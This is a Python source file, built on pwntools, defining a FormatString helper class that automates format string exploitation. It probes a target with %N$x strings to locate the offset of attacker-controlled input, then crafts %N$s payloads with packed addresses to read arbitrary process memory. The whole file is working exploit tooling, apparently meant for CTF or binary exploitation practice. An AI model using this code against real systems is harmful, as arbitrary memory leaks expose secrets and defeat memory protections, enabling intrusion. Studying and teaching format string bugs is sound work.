from pwn import *

class FormatString:
    
    def __init__(self,exec_fmt,arch='i386',bits=32,endian='little',elf=None,maxExplore=32,badChars="\n"):
        """
        elf == pwnlib elf
        exec_fmt == function that takes in a string and returns the exact format string output from it
        badChars == string containing all the bad characters for this format string. For example, newline is often a bad char in format string attacks.
        """
        
        if type(exec_fmt) is not type(lambda x: x):
            log.error("exec_fmt arg must be a callable function.")
            return

        self.arch = arch
        self.bits = bits
        self.endian = endian
        self.elf = elf
        self.exec_fmt = exec_fmt
        self.maxExplore = maxExplore
        self.badChars = badChars

        # Might want to change this sometime...
        self.padChar = "C"
        
        # Where is our controlled buffer?
        self.pad = None
        self.index = None
        
        # The ELF will override the other options
        if elf is not None:
            if type(elf) is not pwnlib.elf.elf.ELF:
                log.warn("ELF argument is wrong type. Expecting pwnlib.elf, got {0}. Ignoring for now.".format(type(elf)))

            else:
                self.arch = elf.arch
                self.bits = elf.bits
                self.endian = elf.endian

        
        # Try to determine where we are in the binary
        self.explore()

    def explore(self):
        """
        Figure out where our input starts as well as other information automatically.
        """
        print("Exploring format string vulnerability...")

        discovered = False
        
        # How big should our search words be?
        wordSize = self.bits / 8

        # Change our output type based on the size we're looking for
        if self.bits == 32:
            outType = "x"
        elif self.bits == 64:
            outType = "lx"
        else:
            log.error("Unknown bits variety {0}".format(self.bits))
            return None
        
        # TODO: Might wanna change this later to something less predictable.
        testInput = "A"*wordSize
        padChar = self.padChar

        # Loop through up to the max exploration depth
        for index in range(1,self.maxExplore):

            # Check for pad offset
            for pad in range(wordSize):
                output = self.exec_fmt("{2}{0}%{3}$0{1}{4}".format(testInput,wordSize*2,padChar * pad,index,outType))
                outputHex = output.split(testInput)[1][:wordSize*2] # grab the hex

                # Check if we found it
                if unhexlify(outputHex)[::-1] == testInput:
                    discovered = True
                    break
            
            # Don't continue if we've found it
            if discovered:
                break

        if discovered:
            print("Found the offset to our input! Index = {0}, Pad = {1}".format(index,pad))
            self.index = index
            self.pad = pad

        else:
            log.warn("Failed to find offset to our input! You will have reduced functionality.")

    def leak(self,addr):
        """
        Given an addr, leak that memory.
        """
        wordSize = self.bits / 8

        # Hand doing this for now due to not necessarily using pwntools...
        if self.bits == 32:
            if self.endian == 'little':
                addr = pack("<I",addr)
            else:
                addr = pack(">I",addr)
        elif self.bits == 64:
            if self.endian == 'little':
                addr = pack("<Q",addr)
            else:
                addr = pack(">Q",addr)
        else:
            log.error("Unable to leak address due to unknown bits size of {0}".format(self.bits))
            return None

        # Check for chars we don't like
        for badChar in self.badChars:
            if badChar in addr:
                return None
        
        # TODO: To simplify things, I give us generically 3 characters (upto index 999) to work with. This might not be desired in some cases. Maybe re-write this later to be more efficient

        # Real index takes into account that our own input is moving this around
        sLineSize = int(wordSize * round(float(6)/wordSize)) / wordSize
        realIndex = self.index + 2 + sLineSize
        sLine = "%{0}$s".format(str(realIndex).rjust(3,"0"))
        sLine = sLine + "J" * (wordSize - (len(sLine) % wordSize)) if (len(sLine) % wordSize) != 0 else sLine # Pad it out to a word length
        
        # TODO: Randomize guard?
        guard = "J"*wordSize

        # Put it together
        fmt = "{0}{1}{2}{4}{3}".format(self.padChar*self.pad,guard,sLine,addr,guard)
        #log.debug("Sending format string: {0}".format(fmt))
        out = self.exec_fmt(fmt)

        # If the leaker failed to return anything, we won't be able to do any more
        if out == None:
            return None
        
        # Split out the output
        out = out[out.index(guard) + len(guard):]
        out = out[:out.index(guard)]

        # Since we're printing strings, let's assume it's a null
        if out == "":
            out = "\x00"

        return out

    def __getitem__(self,addr):
        """
        Get item is shorthand for leaking that memory location of the binary.
        """
        return self.leak(addr)
        

import logging
log = logging.getLogger('FormatString')
from binascii import unhexlify
from struct import pack, unpack
